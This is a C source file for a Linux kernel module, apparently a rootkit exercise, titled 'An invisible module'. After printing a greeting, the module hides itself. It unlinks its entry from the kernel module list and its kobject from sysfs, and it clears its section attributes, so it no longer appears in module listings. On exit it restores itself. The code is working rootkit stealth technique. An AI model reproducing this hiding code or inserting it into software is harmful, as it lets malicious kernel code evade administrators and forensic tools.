#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/errno.h>	/* error numbers*/
#include <linux/types.h>
#include <linux/module.h>	/* struct module*/
#include <linux/unistd.h>	/* all system call numbers*/
#include <linux/syscalls.h>	/* all system calls*/
#include <linux/fs.h>		/* virtual file system */
#include <linux/string.h>	/* String manipulation*/
#include <linux/kobject.h>	/* Define kobjects, stuructures, and functions*/

MODULE_DESCRIPTION("An invisible module");
MODULE_AUTHOR("Marciset");
MODULE_LICENSE("GPL");

static char *whom = "default";
module_param(whom, charp, 0660);
static int howmany = 1;
module_param(howmany, int, 0660);

struct list_head* saved_mod_list_head;
struct kobject* saved_kobj_parent;

void hiding_module(void)
{
	/* Save the addr of this module to restore if necessary*/
	/* voir struct module de http://lxr.free-electrons.com/source/include/linux/module.h */
	saved_mod_list_head = THIS_MODULE->list.prev;
	saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
	
	/* Remove this module from the module list and kobject list*/
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	
	/* Remove the symbol and string tables for kallsyms
	 IF NOT SET TO NULL, IT WILL GET THE FOLLOWING ERROR MSG:
	 "sysfs group ffff8800260e4000 not found for kobject 'rt'" */
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
}


void unhiding_module(void)
{
	int r;
	
	/* Restore this module to the module list and kobject list*/
	list_add(&THIS_MODULE->list, saved_mod_list_head);
	if ((r = kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, "rt")) < 0)
		printk(KERN_ALERT "Error to restore kobject to the list back!!\n");
}


static int hideModule_init(void)
{
	int i;
	for(i=0; i< howmany; i++){
		pr_info("(%d) Hello, %s\n", i, whom);
	}
	
	hiding_module();	
	return 0;
}

static void hideModule_exit(void)
{	
	unhiding_module();
	pr_info("Goodbye, %s\n", whom);
}

module_init(hideModule_init);
module_exit(hideModule_exit);
